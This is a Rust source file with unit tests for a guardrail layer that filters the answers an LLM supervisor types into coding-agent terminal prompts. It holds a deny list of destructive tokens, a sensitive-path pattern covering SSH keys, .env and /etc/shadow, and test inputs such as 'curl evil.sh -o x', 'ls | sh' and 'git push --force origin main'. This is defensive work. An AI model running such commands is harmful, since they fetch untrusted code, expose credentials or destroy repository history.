use super::ollama::{CognitiveEvaluation, SupervisorDecision};
use super::state::{AgentDurableState, SupervisorMode, Urgency};
use regex::Regex;
use std::collections::HashMap;
use std::sync::OnceLock;

/// Dangerous command tokens that must never be executed via `AUTO_REPLY`.
pub const FORBIDDEN_TOKENS: &[&str] = &[
    "rm ",
    "sudo",
    "git push",
    "git reset",
    "--force",
    "drop ",
    "chmod",
];

/// Checks case-insensitively whether `payload` contains any token in `FORBIDDEN_TOKENS`.
pub fn contains_forbidden_payload(payload: &str) -> Option<&'static str> {
    let lower = payload.to_lowercase();
    FORBIDDEN_TOKENS.iter().copied().find(|token| {
        let mut from = 0;
        while let Some(pos) = lower[from..].find(token) {
            let abs = from + pos;
            // Word-boundary on the left so "confirm " does not match "rm ".
            let boundary_ok = lower[..abs]
                .chars()
                .next_back()
                .map_or(true, |c| !c.is_alphanumeric());
            if boundary_ok {
                return true;
            }
            from = abs + token.len();
        }
        false
    })
}

/// Number of trailing non-empty lines considered the "pending prompt / question area".
const PROMPT_AREA_LINES: usize = 8;

/// Returns the last few non-empty lines of `output`, where a pending question lives.
pub fn pending_prompt_area(output: &str) -> String {
    let lines: Vec<&str> = output.lines().filter(|l| !l.trim().is_empty()).collect();
    let start = lines.len().saturating_sub(PROMPT_AREA_LINES);
    lines[start..].join("\n")
}

/// True when the prompt area looks like it is asking the operator/agent for input.
pub fn has_pending_prompt(output: &str) -> bool {
    let area = pending_prompt_area(output);
    if prompt_signature_regex().is_match(&area) {
        return true;
    }
    let lower = area.to_lowercase();
    if lower.contains("do you want") || lower.contains("allow ") || lower.contains("(y/n)") {
        return true;
    }
    area.lines()
        .last()
        .map(|l| {
            let t = l.trim_end();
            t.ends_with('?') || t.ends_with(':')
        })
        .unwrap_or(false)
}

/// Deterministic destructive-command detection restricted to the pending prompt area and the payload
/// (never arbitrary scrollback such as "error" / "aborted" lines).
pub fn detect_destructive(output: &str, payload: &str) -> Option<&'static str> {
    contains_forbidden_payload(&pending_prompt_area(output))
        .or_else(|| contains_forbidden_payload(payload))
}

/// Enforces the "only blocked agents get action cards" policy deterministically.
///
/// * Not blocked  -> always `NoOp` (the rolling summary is still kept by the caller).
/// * Blocked      -> destructive command in the prompt area/payload forces a `Critical` alert with
///   payload `n`; otherwise LLM urgency is capped at `Normal`; an alert without a pending prompt
///   carries no payload.
pub fn enforce_blocked_policy(
    is_blocked: bool,
    output: &str,
    mut eval: CognitiveEvaluation,
) -> CognitiveEvaluation {
    if !is_blocked {
        eval.decision = SupervisorDecision::NoOp;
        eval.urgency = Urgency::Low;
        eval.hc_command_payload.clear();
        eval.reason_for_operator.clear();
        return eval;
    }

    if let Some(token) = detect_destructive(output, &eval.hc_command_payload) {
        eval.decision = SupervisorDecision::AlertOperator;
        eval.urgency = Urgency::Critical;
        eval.hc_command_payload = "n".to_string();
        append_reason(
            &mut eval.reason_for_operator,
            &format!("[Comando destrutivo detectado no terminal: {token}]"),
        );
        return eval;
    }

    if eval.urgency == Urgency::Critical {
        eval.urgency = Urgency::Normal;
    }
    // Blocked on a visible prompt and the model chose to do nothing: nobody would answer and
    // nobody would be told (the same screen is not re-evaluated). Hand it to the operator.
    if eval.decision == SupervisorDecision::NoOp && has_pending_prompt(output) {
        eval.decision = SupervisorDecision::AlertOperator;
        eval.urgency = Urgency::Normal;
        eval.hc_command_payload.clear();
        append_reason(
            &mut eval.reason_for_operator,
            "[Agente aguardando resposta; o supervisor não decidiu]",
        );
        return eval;
    }
    if eval.decision == SupervisorDecision::AlertOperator && !has_pending_prompt(output) {
        eval.hc_command_payload.clear();
    }
    eval
}

fn yn_prompt_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)[\[(]\s*y(es)?\s*/\s*n(o)?\s*[\])]").expect("valid y/n prompt regex")
    })
}

fn yn_hint_payload_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"^[\[(]?\s*y(es)?\s*/\s*n(o)?\s*[\])]?$").expect("valid y/n hint regex")
    })
}

fn identifier_payload_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"^[a-z]+(_[a-z]+)+$").expect("valid identifier regex"))
}

fn yes_no_question_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)\b(continue|proceed)\?").expect("valid yes/no question regex")
    })
}

/// Restricts what an `AUTO_REPLY` may type into a terminal to single keys: `y`, `n`, a 1–2 digit
/// menu choice, or Enter (empty). Anything else — text copied from the screen, free-form
/// instructions — is never typed; the evaluation becomes an operator alert without payload.
///
/// `y`/`n` are only valid on a yes/no prompt (`[y/N]`, `(y/n)`, `Continue?`, `Proceed?`); there,
/// `yes`/`no` map to `y`/`n`, and the two known small-model slips — echoing the prompt hint
/// (`[y/N]`) or a snake_case label (`continue_readonly`) — map to `y`, since the model chose to
/// approve. A prompt whose hc status kind is `question` is never auto-answered: choosing for the
/// human is the operator's call. Must run after `enforce_blocked_policy`.
pub fn sanitize_auto_reply(
    output: &str,
    kind: Option<&str>,
    mut eval: CognitiveEvaluation,
) -> CognitiveEvaluation {
    if eval.decision != SupervisorDecision::AutoReply {
        return eval;
    }
    let raw = eval.hc_command_payload.trim().to_string();
    let p = raw.to_lowercase();
    let area = pending_prompt_area(output);
    let yes_no_prompt =
        yn_prompt_regex().is_match(&area) || yes_no_question_regex().is_match(&area);
    let is_key = |k: &str| k.is_empty() || (k.len() <= 2 && k.chars().all(|c| c.is_ascii_digit()));
    let normalized = if kind.is_some_and(|k| k.eq_ignore_ascii_case("question")) {
        None
    } else {
        match p.as_str() {
            "y" | "yes" if yes_no_prompt => Some("y".to_string()),
            "n" | "no" if yes_no_prompt => Some("n".to_string()),
            _ if yes_no_prompt
                && (yn_hint_payload_regex().is_match(&p)
                    || identifier_payload_regex().is_match(&p)) =>
            {
                Some("y".to_string())
            }
            k if is_key(k) => Some(k.to_string()),
            _ => None,
        }
    };
    match normalized {
        Some(key) => eval.hc_command_payload = key,
        None => {
            eval.decision = SupervisorDecision::AlertOperator;
            if eval.urgency == Urgency::Low {
                eval.urgency = Urgency::Normal;
            }
            eval.hc_command_payload.clear();
            let shown: String = raw.chars().take(60).collect();
            append_reason(
                &mut eval.reason_for_operator,
                &format!("[Resposta automática bloqueada: '{shown}' não serve para este prompt]"),
            );
        }
    }
    eval
}

fn fast_path_regexes() -> &'static [Regex; 6] {
    static RE: OnceLock<[Regex; 6]> = OnceLock::new();
    RE.get_or_init(|| {
        [
            // 0: permission menu "1. Yes" (Claude Code style, optional ❯ cursor)
            Regex::new(r"(?i)^\W*1[.)]\s*yes\b").unwrap(),
            // 1: any menu item line
            Regex::new(r"^\W*\d+[.)]\s").unwrap(),
            // 2: prompt chrome without a command
            Regex::new(r"(?i)^\W*(do you want|would you like)\b|^\W*(bash command|command|permission required)\W*$").unwrap(),
            // 3: shell metacharacters (more than one command, redirection, substitution)
            Regex::new(r"\||;|&&|>|<|\$\(|`").unwrap(),
            // 4: read-only allowlist
            Regex::new(r"^(ls|cat|head|tail|wc|pwd|rg|grep|git\s+(status|diff|log|show))(\s|$)").unwrap(),
            // 5: sensitive paths
            Regex::new(r"(?i)\.ssh|\.gnupg|\.env|id_rsa|id_ed25519|secret|token|credential|password|key|/etc/shadow").unwrap(),
        ]
    })
}

fn command_prefix_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)^\s*(?:[$>❯]\s+|bash\(|run:?\s+|command:?\s+|execute:?\s+)")
            .expect("valid command prefix regex")
    })
}

/// Deterministic approval of trivial read-only commands, before (and without) the LLM.
///
/// Returns `(payload, command)` when the pending prompt is a yes/no prompt (`y`) or a permission
/// menu with `1. Yes` (`1`), the command — the nearest non-chrome line above the prompt — is a
/// single allowlisted read-only command without shell metacharacters or sensitive paths, the
/// prompt area holds nothing destructive, and the hc kind is not `question`. Otherwise `None`
/// and the normal LLM flow decides. See docs/superpowers/specs/2026-11-15-readonly-fast-path-design.md.
pub fn readonly_fast_path(output: &str, kind: Option<&str>) -> Option<(String, String)> {
    if kind.is_some_and(|k| k.eq_ignore_ascii_case("question")) {
        return None;
    }
    if detect_destructive(output, "").is_some() {
        return None;
    }
    let [menu_yes, menu_item, chrome, metachar, allow, sensitive] = fast_path_regexes();
    let area = pending_prompt_area(output);
    let lines: Vec<&str> = area
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    let is_yes_no = |l: &str| yn_prompt_regex().is_match(l) || yes_no_question_regex().is_match(l);

    // A permission menu wins: its question line ("Do you want to proceed?") is not a y/n prompt.
    let payload = if lines.iter().any(|l| menu_yes.is_match(l)) {
        "1"
    } else if lines.iter().any(|l| is_yes_no(l)) {
        "y"
    } else {
        return None;
    };

    let raw = lines
        .iter()
        .rev()
        .find(|l| !is_yes_no(l) && !menu_item.is_match(l) && !chrome.is_match(l))?;
    let had_bash_paren = raw.to_ascii_lowercase().starts_with("bash(");
    let mut cmd = command_prefix_regex().replace(raw, "").trim().to_string();
    if had_bash_paren {
        cmd = cmd.trim_end_matches(')').trim().to_string();
    }

    if metachar.is_match(&cmd) || !allow.is_match(&cmd) || sensitive.is_match(&cmd) {
        return None;
    }
    Some((payload.to_string(), cmd))
}

fn error_signature_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"ERR!|panic:|thread '.*' panicked|Traceback \(most recent call last\)|FATAL|Segmentation fault|error\[E",
        )
        .expect("valid error signature regex")
    })
}

fn prompt_signature_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\[y/N\]|\[Y/n\]|\(y/n\)|(?i:Continue\?|Press Enter|Proceed\?)")
            .expect("valid prompt signature regex")
    })
}

/// Detects deterministic error, interactive prompt, or repeated-line loop signatures.
pub fn has_error_or_loop_signature(output: &str) -> bool {
    if error_signature_regex().is_match(output) || prompt_signature_regex().is_match(output) {
        return true;
    }

    let lines: Vec<&str> = output.lines().collect();
    let tail = if lines.len() > 25 {
        &lines[lines.len() - 25..]
    } else {
        &lines[..]
    };

    let mut counts: HashMap<&str, usize> = HashMap::new();
    for line in tail {
        let trimmed = line.trim();
        if trimmed.chars().count() >= 12 && trimmed.chars().any(|c| c.is_alphanumeric()) {
            let count = counts.entry(trimmed).or_insert(0);
            *count += 1;
            if *count >= 3 {
                return true;
            }
        }
    }

    false
}

fn append_reason(reason: &mut String, note: &str) {
    if reason.trim().is_empty() {
        reason.clear();
        reason.push_str(note);
    } else {
        if !reason.ends_with(' ') {
            reason.push(' ');
        }
        reason.push_str(note);
    }
}

/// Applies deterministic guardrails to an LLM evaluation before any `hc` side effect.
pub fn validate_evaluation(
    state: &AgentDurableState,
    mode: SupervisorMode,
    mut eval: CognitiveEvaluation,
) -> CognitiveEvaluation {
    // Rule 1: Loop Breaker
    if eval.decision == SupervisorDecision::AutoReply
        && state.consecutive_auto_replies >= state.max_auto_replies
    {
        eval.decision = SupervisorDecision::AlertOperator;
        append_reason(
            &mut eval.reason_for_operator,
            "[Limite de auto-resposta atingido]",
        );
    }

    // Rule 2: Forbidden Payload Filter
    if eval.decision == SupervisorDecision::AutoReply {
        if let Some(token) = contains_forbidden_payload(&eval.hc_command_payload) {
            eval.decision = SupervisorDecision::AlertOperator;
            eval.urgency = Urgency::Critical;
            append_reason(
                &mut eval.reason_for_operator,
                &format!("[Payload bloqueado pelo filtro de segurança: {token}]"),
            );
        }
    }

    // Rule 3: Empty Payload Guard
    if eval.decision == SupervisorDecision::AutoReply && eval.hc_command_payload.trim().is_empty() {
        eval.decision = SupervisorDecision::NoOp;
    }

    // Rule 4: Supervisor Mode Filter
    if mode == SupervisorMode::AlertOnly && eval.decision == SupervisorDecision::AutoReply {
        eval.decision = SupervisorDecision::AlertOperator;
        append_reason(&mut eval.reason_for_operator, "[Modo Somente Alerta ativo]");
    }

    eval
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::supervisor::state::LifecycleState;

    fn sample_eval(decision: SupervisorDecision, payload: &str) -> CognitiveEvaluation {
        CognitiveEvaluation {
            updated_summary: "Agente aguardando confirmação.".to_string(),
            detected_state: LifecycleState::WaitingConfirmation,
            decision,
            urgency: Urgency::Normal,
            hc_command_payload: payload.to_string(),
            reason_for_operator: "Confirmação necessária.".to_string(),
        }
    }

    #[test]
    fn test_loop_breaker_downgrades_auto_reply() {
        let mut state = AgentDurableState::new("t1", "worker", 2, 100);
        state.consecutive_auto_replies = 2;

        let validated = validate_evaluation(
            &state,
            SupervisorMode::SemiAuto,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );

        assert_eq!(validated.decision, SupervisorDecision::AlertOperator);
        assert!(validated
            .reason_for_operator
            .ends_with("[Limite de auto-resposta atingido]"));
    }

    #[test]
    fn test_forbidden_tokens_downgrade_to_critical_alert() {
        let state = AgentDurableState::new("t1", "worker", 2, 100);

        for token in FORBIDDEN_TOKENS {
            let payload = format!("run {} something", token.to_uppercase());
            let validated = validate_evaluation(
                &state,
                SupervisorMode::SemiAuto,
                sample_eval(SupervisorDecision::AutoReply, &payload),
            );
            assert_eq!(
                validated.decision,
                SupervisorDecision::AlertOperator,
                "token {token} should be blocked"
            );
            assert_eq!(validated.urgency, Urgency::Critical);
            assert!(validated.reason_for_operator.contains(&format!(
                "[Payload bloqueado pelo filtro de segurança: {token}]"
            )));
        }
    }

    #[test]
    fn test_empty_payload_downgrades_to_noop() {
        let state = AgentDurableState::new("t1", "worker", 2, 100);
        let validated = validate_evaluation(
            &state,
            SupervisorMode::SemiAuto,
            sample_eval(SupervisorDecision::AutoReply, "   "),
        );
        assert_eq!(validated.decision, SupervisorDecision::NoOp);
    }

    #[test]
    fn test_alert_only_mode_downgrades_auto_reply() {
        let state = AgentDurableState::new("t1", "worker", 2, 100);
        let validated = validate_evaluation(
            &state,
            SupervisorMode::AlertOnly,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );
        assert_eq!(validated.decision, SupervisorDecision::AlertOperator);
        assert!(validated
            .reason_for_operator
            .contains("[Modo Somente Alerta ativo]"));
    }

    #[test]
    fn test_error_and_loop_signatures() {
        let normal = "Compiling cockpit v0.1.0\nFinished dev [unoptimized] target(s)";
        assert!(!has_error_or_loop_signature(normal));

        let borders = "================\n================\n================";
        assert!(!has_error_or_loop_signature(borders));

        assert!(has_error_or_loop_signature("Do you want to proceed? [y/N]"));
        assert!(has_error_or_loop_signature("Press Enter to continue"));
        assert!(has_error_or_loop_signature(
            "Traceback (most recent call last):\n  File \"app.py\", line 1"
        ));
        assert!(has_error_or_loop_signature(
            "thread 'main' panicked at 'boom'"
        ));
        assert!(has_error_or_loop_signature(
            "error[E0308]: mismatched types"
        ));

        let repeated = "Error: connection refused on port 5432\n\
                        Error: connection refused on port 5432\n\
                        Error: connection refused on port 5432";
        assert!(has_error_or_loop_signature(repeated));
    }

    const HOOKS_ERROR_OUTPUT: &str =
        "HooksError: git process aborted after 2000ms in tickets-pane\n\
        HooksError: git process aborted after 2000ms in tickets-pane\n\
        Waiting for background agent to finish...";

    #[test]
    fn test_working_agent_with_hooks_error_is_noop() {
        let mut eval = sample_eval(SupervisorDecision::AlertOperator, "n");
        eval.urgency = Urgency::Critical;
        let out = enforce_blocked_policy(false, HOOKS_ERROR_OUTPUT, eval);
        assert_eq!(out.decision, SupervisorDecision::NoOp);
        assert_eq!(out.urgency, Urgency::Low);
        assert!(out.hc_command_payload.is_empty());
        assert_eq!(out.updated_summary, "Agente aguardando confirmação.");
    }

    #[test]
    fn test_hooks_error_text_never_triggers_destructive_detection() {
        assert!(detect_destructive(HOOKS_ERROR_OUTPUT, "").is_none());
        assert!(detect_destructive("Please confirm the change", "").is_none());
    }

    #[test]
    fn test_blocked_force_push_prompt_is_critical_alert() {
        let output = "Bash command\n  git push --force origin main\nDo you want to proceed? (y/n)";
        let out = enforce_blocked_policy(
            true,
            output,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert_eq!(out.urgency, Urgency::Critical);
        assert_eq!(out.hc_command_payload, "n");
    }

    #[test]
    fn test_blocked_safe_prompt_keeps_auto_reply_and_caps_llm_critical() {
        let output = "Run cargo test?\nProceed? (y/n)";
        let out = enforce_blocked_policy(
            true,
            output,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );
        assert_eq!(out.decision, SupervisorDecision::AutoReply);

        let mut alert = sample_eval(SupervisorDecision::AlertOperator, "n");
        alert.urgency = Urgency::Critical;
        let out = enforce_blocked_policy(true, output, alert);
        assert_eq!(out.urgency, Urgency::Normal);
    }

    #[test]
    fn test_alert_without_pending_prompt_has_no_payload() {
        let mut alert = sample_eval(SupervisorDecision::AlertOperator, "n");
        alert.urgency = Urgency::Normal;
        let out = enforce_blocked_policy(true, "Task finished.\nAll done", alert);
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
    }

    fn auto(payload: &str) -> CognitiveEvaluation {
        let mut e = sample_eval(SupervisorDecision::AutoReply, payload);
        e.urgency = Urgency::Low;
        e
    }

    #[test]
    fn sanitize_yn_prompt_echoed_hint_becomes_y() {
        // Test 2 / safe-ls: the model sent the literal "[y/N]" copied from the screen.
        let out = sanitize_auto_reply("List files in src/?\nProceed? [y/N]", None, auto("[y/N]"));
        assert_eq!(out.decision, SupervisorDecision::AutoReply);
        assert_eq!(out.hc_command_payload, "y");
    }

    #[test]
    fn sanitize_yn_prompt_maps_words_and_case() {
        let area = "Read README.md? (y/n)";
        assert_eq!(
            sanitize_auto_reply(area, None, auto(" Yes ")).hc_command_payload,
            "y"
        );
        assert_eq!(
            sanitize_auto_reply(area, None, auto("N")).hc_command_payload,
            "n"
        );
        assert_eq!(
            sanitize_auto_reply(area, None, auto("continue_readonly")).hc_command_payload,
            "y"
        );
    }

    #[test]
    fn sanitize_free_text_becomes_alert_without_payload() {
        let out = sanitize_auto_reply("Proceed? [y/N]", None, auto("sure, go ahead"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert_eq!(out.urgency, Urgency::Normal);
        assert!(out.hc_command_payload.is_empty());
        assert!(out.reason_for_operator.contains("sure, go ahead"));

        let out = sanitize_auto_reply("Waiting for input...", None, auto("cargo test"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
    }

    #[test]
    fn sanitize_numbered_choice_and_enter_allowed() {
        let menu = "Which one?\n1. Keep\n2. Replace\n3. Abort\nChoose:";
        assert_eq!(
            sanitize_auto_reply(menu, None, auto("2")).hc_command_payload,
            "2"
        );
        assert_eq!(
            sanitize_auto_reply(menu, None, auto("Replace")).decision,
            SupervisorDecision::AlertOperator
        );
        let enter = sanitize_auto_reply("Press Enter to continue", None, auto(""));
        assert_eq!(enter.decision, SupervisorDecision::AutoReply);
        assert_eq!(enter.hc_command_payload, "");
    }

    #[test]
    fn sanitize_leaves_other_decisions_untouched() {
        let alert = sample_eval(SupervisorDecision::AlertOperator, "n");
        assert_eq!(
            sanitize_auto_reply("rm -rf? [y/N]", None, alert.clone()),
            alert
        );
    }

    #[test]
    fn sanitize_y_on_numbered_question_becomes_alert() {
        // Test 4 / pergunta: "Responda 1, 2 ou 3" got "y" typed.
        let q = "Qual banco usar?\n1) Postgres\n2) SQLite\n3) Mongo\nResponda 1, 2 ou 3:";
        let out = sanitize_auto_reply(q, None, auto("y"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
    }

    #[test]
    fn sanitize_question_kind_is_never_auto_answered() {
        let q = "Qual banco usar?\n1) Postgres\n2) SQLite\nResponda 1 ou 2:";
        let out = sanitize_auto_reply(q, Some("question"), auto("2"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
        // A permission menu (Claude Code style) may still be answered with a number.
        let perm = "Allow Bash(ls)?\n1. Yes\n2. No";
        assert_eq!(
            sanitize_auto_reply(perm, Some("permission"), auto("1")).hc_command_payload,
            "1"
        );
    }

    #[test]
    fn blocked_noop_with_pending_prompt_alerts_operator() {
        // Test 3/4 / write-ambiguo: NO_OP on a blocked prompt meant nobody answered and nobody was told.
        let noop = sample_eval(SupervisorDecision::NoOp, "");
        let out = enforce_blocked_policy(true, "Edit src/config.rs\nAllow? [y/N]", noop.clone());
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert_eq!(out.urgency, Urgency::Normal);
        assert!(out.hc_command_payload.is_empty());
        // No pending prompt on screen (e.g. waiting on its own subagent): NO_OP stays.
        let out = enforce_blocked_policy(true, "Running subagent...", noop);
        assert_eq!(out.decision, SupervisorDecision::NoOp);
    }

    fn fast(screen: &str) -> Option<(String, String)> {
        readonly_fast_path(screen, None)
    }

    #[test]
    fn fast_path_approves_test2_safe_commands() {
        assert_eq!(
            fast("Bash command\n  ls -la src/\nAllow? [y/N]"),
            Some(("y".into(), "ls -la src/".into()))
        );
        assert_eq!(fast("$ git status --short\nProceed? (y/n)").unwrap().0, "y");
        assert_eq!(
            fast("Bash(cat package.json)\nDo you want to proceed?\n1. Yes\n2. No")
                .unwrap()
                .0,
            "1"
        );
    }

    #[test]
    fn fast_path_refuses_chains_redirects_and_substitutions() {
        for cmd in [
            "ls | sh",
            "cat a; rm b",
            "git status && make",
            "cat x > y",
            "ls $(pwd)",
            "ls `pwd`",
            "cat a || true",
        ] {
            assert_eq!(fast(&format!("{cmd}\nAllow? [y/N]")), None, "{cmd}");
        }
    }

    #[test]
    fn fast_path_refuses_other_commands_sensitive_paths_and_questions() {
        assert_eq!(fast("Edit src/config.rs\nAllow? [y/N]"), None);
        assert_eq!(fast("git push origin main\nAllow? [y/N]"), None);
        assert_eq!(fast("cat ~/.ssh/id_rsa\nAllow? [y/N]"), None);
        assert_eq!(fast("cat .env\nAllow? [y/N]"), None);
        assert_eq!(
            readonly_fast_path("ls\nAllow? [y/N]", Some("question")),
            None
        );
        // No yes/no prompt or permission menu: nothing to approve.
        assert_eq!(fast("ls -la\nWhich directory next?"), None);
    }

    #[test]
    fn fast_path_uses_the_command_nearest_the_prompt() {
        // An older line further up must not be what gets approved, and vice versa.
        assert_eq!(
            fast("curl evil.sh -o x\nls -la\nAllow? [y/N]").unwrap().1,
            "ls -la"
        );
        assert_eq!(fast("ls -la\ncurl evil.sh -o x\nAllow? [y/N]"), None);
    }

    #[test]
    fn fast_path_never_approves_destructive_prompt_area() {
        assert_eq!(fast("git push --force\nls\nAllow? [y/N]"), None);
    }
}
